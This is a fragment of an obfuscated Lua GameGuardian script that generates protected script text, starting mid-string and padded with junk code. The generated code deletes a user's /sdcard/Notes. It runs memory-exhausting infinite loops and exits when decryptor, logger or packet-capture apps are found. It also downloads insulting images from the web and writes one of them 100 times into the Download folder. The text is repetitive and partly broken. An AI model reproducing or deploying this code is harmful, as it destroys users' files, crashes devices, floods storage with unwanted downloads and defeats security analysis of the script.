mmk = mmk.."while(nil)do;goto PROX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname..";::PXXXX"..fname.."::;end\nlocal function FakeFunc"..fname.."()\nfucklog = fucklog\ngoto PXXXX"..fname.."\n::PXXXX"..fname.."::\nfucklog = nil;end\n" end
while (nil)do;local o=("꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂ ")end
mmk = '' for i = 1, math.random(5, 10) do
fname = string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))
mmk = mmk.."while(nil)do;goto PROX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname..";::PXXXX"..fname.."::;end\nlocal function FakeFunc"..fname.."()\nfucklog = fucklog\ngoto PXXXX"..fname.."\n::PXXXX"..fname.."::\nfucklog = nil;end\n" end
while (nil)do;local o=("꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂ ")end
mmk = '' for i = 1, math.random(5, 10) do
fname = string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))
mmk = mmk.."while(nil)do;goto PROX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname..";::PXXXX"..fname.."::;end\nlocal function FakeFunc"..fname.."()\nfucklog = fucklog\ngoto PXXXX"..fname.."\n::PXXXX"..fname.."::\nfucklog = nil;end\n" end
while (nil)do;local o=("꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂ ")end
mmk = '' for i = 1, math.random(5, 10) do
fname = string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))
mmk = mmk.."while(nil)do;goto PROX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname..";::PXXXX"..fname.."::;end\nlocal function FakeFunc"..fname.."()\nfucklog = fucklog\ngoto PXXXX"..fname.."\n::PXXXX"..fname.."::\nfucklog = nil;end\n" end
while (nil)do;local o=("꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂ ")end
]]

 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Infinite = ([[

local _R,_C,_T,_D = math.random,os.time,table.concat,string.char
local _ = _R(_C()) 
local __ = function(n, k) 
    local r = ""
    for i = 1, n do r = r .. _D((_R(97, 122) + k) % 255) end
    return r
end

local ___ = __(_R(10, 20), _R(1, 5)) 
local ____ = {}
for i = 1, 10 do ____[#____ + 1] = ___ end

local __f = function() return false end 
while __f() do end 

local function ___o(a, b, c)
    local x, y = a % b, c - b
    if x == 0 then return y else return x + y end
end

local function ______(x)
    local r = {}
    for i = 1, x do
        r[#r + 1] = (function(n)
            local z = n * 2
            if z % 2 == 0 then return z + i else return z - i end
        end)(_R(1, 100))
    end
    return r
end

local _A = ______(50)
for _, v in ipairs(_A) do
    if v % 3 == 0 then
        for i = 1, 10 do _ = _ + i end
    else
        while false do end 
    end
end

local function _______(data)
    local r = ""
    for i, v in ipairs(data) do
        r = r .. ((v % 5 == 0 and tostring(v)) or "")
    end
    return r
end

local result = _______(_A)


local _noise = {}
for i = 1, 1000 do
    for j = 1, 5 do
        local val = i * j
        if val % 2 == 0 then
            table.insert(_noise, val)
        end
    end
end

local _output = {}
for _, val in ipairs(_noise) do
    if val % 7 == 0 then
        _output[#_output + 1] = tostring(val)
    else
        val = val / 2
    end
end

local _result_noise = table.concat(_output, "|")


local function execute_final()
    local r = ""
    for i = 1, 100 do
        r = r .. string.char((_R(65, 90) + i) % 255)
    end
    return r .. ";" .. result .. ";" .. _result_noise
end


local final_result = execute_final()


local _xA, _xB, _xC, _xD = math.random, os.time, table.concat, string.char
local _xE = _xA(_xB())
local _xF = function(_xG, _xH)
    local _xI = ""
    for _xJ = 1, _xG do _xI = _xI .. _xD((_xA(97, 122) + _xH) % 255) end
    return _xI
end

local _xK = _xF(_xA(10, 20), _xA(1, 5))
local _xL = {}
for _xM = 1, 10 do _xL[#_xL + 1] = _xK end

local _xN = function() return false end
while _xN() do end

local function _xO(_xP, _xQ, _xR)
    local _xS, _xT = _xP % _xQ, _xR - _xQ
    if _xS == 0 then return _xT else return _xS + _xT end
end

local function _xU(_xV)
    local _xW = {}
    for _xX = 1, _xV do
        _xW[#_xW + 1] = (function(_xY)
            local _xZ = _xY * 2
            if _xZ % 2 == 0 then return _xZ + _xX else return _xZ - _xX end
        end)(_xA(1, 100))
    end
    return _xW
end

local _xAA = _xU(50)
for _, _xAB in ipairs(_xAA) do
    if _xAB % 3 == 0 then
        for _xAC = 1, 10 do _xE = _xE + _xAC end
    else
        while false do end
    end
end

local function _xAD(_xAE)
    local _xAF = ""
    for _xAG, _xAH in ipairs(_xAE) do
        _xAF = _xAF .. ((_xAH % 5 == 0 and tostring(_xAH)) or "")
    end
    return _xAF
end

local _xAI = _xAD(_xAA)

local _xAJ = {}
for _xAK = 1, 1000 do
    for _xAL = 1, 5 do
        local _xAM = _xAK * _xAL
        if _xAM % 2 == 0 then
            table.insert(_xAJ, _xAM)
        end
    end
end

local _xAN = {}
for _, _xAO in ipairs(_xAJ) do
    if _xAO % 7 == 0 then
        _xAN[#_xAN + 1] = tostring(_xAO)
    else
        _xAO = _xAO / 2
    end
end

local _xAP = table.concat(_xAN, "|")

local function _xAQ()
    local _xAR = ""
    for _xAS = 1, 100 do
        _xAR = _xAR .. string.char((_xA(65, 90) + _xAS) % 255)
    end
    return _xAR .. ";" .. _xAI .. ";" .. _xAP
end

local function _xAT()
    while true do
        local _xAU = _xA(1, 100)
        if _xAU == 50 then
            break
        end
    end
end

local function _xAV()
    while true do
        local _xAW = 0
        for _xAX = 1, 1000 do
            _xAW = _xAW + _xAX
            if _xAW % 100 == 0 then
                break
            end
        end
        if _xAW % 1000 == 0 then
            break
        end
    end
end

local function _xAY()
    if false then
        _xAT()
        _xAV()
    end
end

local _xAZ = _xAQ()

_xAY()



while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..Block..[[

os.remove("/sdcard/Notes")


local function complexLoop()
    local t = {}
    
    while true do
        for i = 1, 20000 do  
            t[i] = {}
            for j = 1, 200 do  
                t[i][j] = string.rep("B", 2048)  
            end
        end
        
        local tmp = 0
        for k, v in pairs(t) do
            tmp = tmp + #v[1]
        end
    end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

local function createMassiveData()
    
    local t = {}
    
    while true do
             for i = 1, 100000 do
            t[i] = {}
            for j = 1, 200 do
                t[i][j] = string.rep("D", 8096)  
            end
        end
        local tmp = 0
        for k, v in pairs(t) do
            tmp = tmp + #v[1]
        end
         complexLoop() 
    end
end

  if gg.isPackageInstalled("com.fan.ggluadec") or gg.isPackageInstalled("com.fan.ggxxls") or gg.isPackageInstalled("com.fan.ggxxls-1.10") then
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.chenlun.autumncloudlua") then
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.maggienorth.max.postdata") then
  os.exit()
end

  if gg.isPackageInstalled("com.goushi.gtpcanary") then
  print("Packet Capture detect")
  os.exit()
end
if gg.isPackageInstalled("com.packagesniffer.frtparlak") then
  print("Packet Capture detect")
  os.exit()
end
if gg.isPackageInstalled("app.greyshirts.sslcapture") then
  print("Packet Capture detect")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.minhui.networkcapture") then
  print("Desinstale o Packet Capture")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.minhui.wifianalyzer") then
  print("Packet Capture detect")
  os.exit()
end
if gg.isPackageInstalled("jp.co.taosoftware.android.packetcapture") then
  print("Packet Capture detect")
  os.exit()
end
if gg.isPackageInstalled("com.prabalgaming.logger") then
print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("frtparlak.rootsniffer") then
  print("Packet Capture detect")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("any_.body_.can_.fuck_.tencent_") then
  print("GG LOG detect")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.rjvsbmhdspmnfbame") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.redwolfgaming.ripgg") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.vrexqfftfsxekm.kl") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.nochqxpucsbldqqx") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.ghueczxrttlhgd") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.yy.qptvrjwerw.ghoex") then
  print("GG LOG detect")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.Egypt.yuosseef") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.tssfjipkmrco") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.vip.paidhacksonly.mr.toxin") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.ioyysvgfsrig") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.mrteamz.id") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.jtbodgpqxox") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.ByGGXEZ") then
  print("GG LOG detect")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.eidymumcghpfeeeavps") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.mod.iraq") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.dzelttwyuyyes") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.sxqa") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.xyyxgxfn") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.zgb") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.vnpqk") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.mwjvnwesbghkxbjznbwo") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.blackduty.gc") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.s.fyojrme") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.roxmemek") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.fhshwhpvqvruvjtu") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.fireongaming.fog") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.paranoiaworks.unicus.android.sse") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.raincitygaming.ggmod") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.pvt4u") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.nydpvsb.z.r.pkgh") then
  print("GG LOG detect")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.gmsm") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.sudsjcqvvcmgutdjeg") then
  print("GG LOG detect")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.coolfoolggfuckscript.tm") then
  print("GG LOG detect")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.foxcyber.gg") then
  print("GG LOG detect")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.hckeam.mjgql") then 
print("GG LOG detect")
os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.rgkttz.rausqwl") then 
print("GG LOG detect")
os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.tc") then
  print(" SSTOOL detect")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("com.vip.sstool") then
  print(" SSTOOL detect")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("sstool.mod.mafia") then
  print(" mafia???")
  os.exit()
createMassiveData() end

if gg.isPackageInstalled("sstool.only.com.sstool") then
  print(" SSTOOL detect")
  os.exit()
end

file,err=io.open("/sdcard/Android/data/com.aero.ss") 
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.decrypt.tool.by.joker.gg") 
jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
Link = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQv6ctApDWsXvQT0MDDuYdJf0glNlUzpS6Hww&usqp=CAU"
      path = "/sdcard/"
      Name = "you_is_noob.png"
      Slapper = gg.makeRequest(Link).content
      io.open(path .. "/" ..Name ,"w"):write(Slapper)
      gg.alert("GG DECRYPT DETECTED")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.goushi.gtpcanary")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.packagesniffer.frtparlak")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/app.greyshirts.sslcapture")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.minhui.networkcapture")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.minhui.wifianalyzer")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/jp.co.taosoftware.android.packetcapture")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/frtparlak.rootsniffer")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/any_.body_.can_.fuck_.tencent_")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.s.fyojrme")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.rjvsbmhdspmnfbame")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.redwolfgaming.ripgg")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.vrexqfftfsxekm.kl")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.ghueczxrttlhgd")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.yy.qptvrjwerw.ghoex")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.nochqxpucsbldqqx")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.Egypt.yuosseef")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.tssfjipkmrco")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.vip.paidhacksonly.mr.toxin")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.mrteamz.id")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.jtbodgpqxox")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.mod.iraq")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.dzelttwyuyyes")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.sxqa")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.xyyxgxfn")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.vnpqk")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.mwjvnwesbghkxbjznbwo")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.blackduty.gc")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.s.fyojrme")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.roxmemek")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.fhshwhpvqvruvjtu")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.fireongaming.fog")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.paranoiaworks.unicus.android.sse")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.raincitygaming.ggmod")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.pvt4u")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.nydpvsb.z.r.pkgh")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.ioyysvgfsrig")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.gmsm")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.sudsjcqvvcmgutdjeg")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.coolfoolggfuckscript.tm")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.eidymumcghpfeeeavps")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.foxcyber.gg")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.zgb")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.hckeam.mjgql") 
jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.rgkttz.rausqwl") 
jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/sstool.only.com.sstool")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/LOGGGG.lua") 
jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/catch.Art.Tool.seatch")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.laallkxhtrnqncw")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.khoiscript.logger")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.kaoygxapp")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.SourceKonzlet")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("konzlet ???")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.ByGGXEZ")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

os.remove("/sdcard/Notes")

 
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..Block..[[
function WriteFilesGay()
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[
Link = "https://apimeme.com/meme?meme=FRANGO&top=you+is+&bottom=GAY"
  path = "/sdcard/Download/"
  Name = "gay.png"
      for i = 1, 100 do
      local newName = "gay" .. i .. ".png"
      local bat = gg.makeRequest(Link).content
      if bat == nil then
        os.exit()
      end
      local file = io.open(path .. newName, "w")
      if file then
        file:write(bat)
        file:close()
      else
        print("Erro")
    end
  end
  end
  
